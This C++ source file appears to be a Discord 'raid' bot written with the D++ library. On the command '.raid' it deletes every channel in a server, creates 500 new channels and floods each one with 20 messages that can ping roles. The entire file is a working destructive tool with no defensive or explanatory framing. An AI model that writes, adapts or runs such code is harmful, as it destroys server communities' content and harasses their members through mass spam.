#include <iostream>
#include <thread>
#include <chrono>
#include <string>
#include <dpp/dpp.h>

using namespace dpp;
using namespace std;

cluster bot(getenv("TOKEN"), i_default_intents | i_message_content);
vector<snowflake> s;

void callback_thing(string what)
{
  cout << what << endl;
}

void send_message(channel ch) 
{
  try {
    bot.message_create(message(ch.id, getenv("RBOT_MESSAGE")).set_allowed_mentions(false, false, true, false, s, s));
    cout << "Message sent to " << ch.id << endl;
  } catch (...) {
    cout << "Error sending message to: " << ch.id << endl;
  }
}

void message_sender(channel s) {
  for(int i = 0; i < 20; i++) {
    std::thread t(send_message, s);
    t.detach();
  }
}

void ch_creator(channel ch) 
{
  try {
    channel s = bot.channel_create_sync(ch);
    cout << "Channel Created: " << s.id << endl;
    std::thread t(message_sender, s);
    t.detach();
  } catch (...) {
    cout << "Error creating channel on guild: " << ch.guild_id << endl;
  }
}

void ch_delete(snowflake id)
{
  try {
    bot.channel_delete_sync(move(id));
    cout << "Channel Deleted: " << id << endl;
  } catch (...) {
    cout << "Error Deleting channel: " << id << endl;
  }
}

int main()
{
  bot.on_ready([](const auto & event) {
    cout << "Bot logged in as: " << bot.me.username << endl;
  });

  bot.on_message_create([](const auto & event) {
    if (event.msg.content == ".raid") {
      bot.message_create(message(event.msg.channel_id, "Starting.."));
      channel_map channels = bot.channels_get_sync(event.msg.guild_id);
      cout << "Channels fetched of: " << event.msg.guild_id << endl;
      for(auto& state: channels) {
        std::thread th(ch_delete, state.second.id);
        th.detach();
      }

      this_thread::sleep_for(std::chrono::seconds(5));

      channel ch;
      ch.set_name(getenv("RBOT_CHANNEL_NAME"));
      ch.set_guild_id(event.msg.guild_id);
      for(int i = 0; i < 500; i++) {
        this_thread::sleep_for(200ms);
        std::thread th(ch_creator, ch);
        th.detach();
      }
    }
  });

  bot.start(false);
  return 0;
}
